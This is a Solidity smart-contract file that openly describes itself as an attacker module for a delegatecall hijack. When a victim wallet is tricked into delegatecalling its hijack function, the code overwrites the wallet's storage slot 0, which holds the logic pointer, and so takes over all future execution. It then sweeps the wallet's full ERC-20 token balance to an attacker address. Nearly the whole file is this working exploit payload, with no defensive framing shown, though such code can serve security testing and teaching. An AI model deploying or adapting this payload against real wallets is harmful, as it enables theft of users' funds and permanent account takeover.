// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20Minimal {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @title AccountTakeoverModule - the attacker contract reached via delegatecall.
/// @notice When a wallet `delegatecall`s `hijack(...)`, this code runs IN THE WALLET'S
///         storage context (`address(this)` is the wallet, msg.sender to the token is the
///         wallet). It (1) overwrites the wallet's slot 0 - the implementation/`masterCopy`
///         logic pointer - seizing all future execution, and (2) sweeps the wallet's token
///         balance to the attacker. Both effects are the real delegatecall-hijack: the
///         victim signed what looked like a transfer; the payload was a delegatecall here.
contract AccountTakeoverModule {
    /// @param newImplementation value written into the victim account's slot 0.
    /// @param token             an ERC-20 the victim account holds.
    /// @param attacker          recipient of the swept balance.
    function hijack(address newImplementation, address token, address attacker) external {
        // Overwrite slot 0 of the CALLING account (delegatecall => its storage).
        assembly {
            sstore(0, newImplementation)
        }
        // Running as the account, move its own balance out.
        uint256 bal = IERC20Minimal(token).balanceOf(address(this));
        if (bal > 0) {
            require(IERC20Minimal(token).transfer(attacker, bal), "sweep failed");
        }
    }
}
